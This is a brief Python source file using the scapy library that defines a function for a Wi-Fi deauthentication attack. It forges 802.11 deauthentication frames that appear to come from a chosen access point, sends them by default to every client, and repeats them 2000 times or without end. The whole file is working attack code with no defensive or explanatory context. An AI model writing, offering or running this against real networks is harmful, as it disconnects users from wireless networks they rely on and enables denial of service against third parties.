from scapy.all import *
from scapy import *

# Deauthentication attack
def deauth(interface, bssid_addr, destination_addr = 'ff:ff:ff:ff:ff:ff', forever = False):
    dot11 = Dot11(addr1=destination_addr, addr2=bssid_addr, addr3=bssid_addr)
    pkt = RadioTap()/dot11/Dot11Deauth(reason=7)
    if not forever:
        sendp(pkt, iface=interface, inter=0.1, count=2000, verbose=0)
    else:
        sendp(pkt, iface=interface, inter=0.1, loop=True, verbose=0)